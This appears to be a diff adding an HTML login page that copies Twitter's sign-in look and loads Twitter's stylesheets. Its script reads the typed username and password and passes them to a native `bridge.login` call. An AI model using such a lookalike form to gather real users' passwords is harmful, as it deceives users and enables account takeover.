@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login</title>
+
+    <link rel="stylesheet" href="https://abs.twimg.com/a/1530292537/css/t1/twitter_core.bundle.css"
+          class="coreCSSBundles">
+    <link rel="stylesheet" class="moreCSSBundles"
+          href="https://abs.twimg.com/a/1530292537/css/t1/twitter_more_1.bundle.css">
+    <link rel="stylesheet" class="moreCSSBundles"
+          href="https://abs.twimg.com/a/1530292537/css/t1/twitter_more_2.bundle.css">
+
+    <script>
+        
+        function login() {
+
+            var username = document.querySelector("#username").value;
+            var pwd = document.querySelector("#pwd").value;
+
+            bridge.login(username, pwd);
+
+        }
+        
+    </script>
+    
+</head>
+<body>
+<div class="page-canvas" style="margin-top: 80px; background-color: #cecece;">
+
+    <div class="signin-wrapper" data-login-message="">
+        <h1>Log in using your Twitter account.</h1>
+        <form class="t1-form clearfix signin js-signin">
+            <fieldset>
+
+                <legend class="visuallyhidden">Log in</legend>
+
+                <div class="clearfix field">
+                    <input id="username" class="js-username-field email-input js-initial-focus" name="session[username_or_email]"
+                           autocomplete="on" value="" placeholder="Phone, email or username" type="text">
+                </div>
+                <div class="clearfix field">
+                    <input id="pwd" class="js-password-field" name="session[password]" placeholder="Password" type="password">
+                </div>
+
+            </fieldset>
+
+            <div class="clearfix">
+
+                <button type="submit" onclick="login()" class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Log in</button>
+
+            </div>
+
+        </form>
+    </div>
+
+</div>
+</body>
+</html>
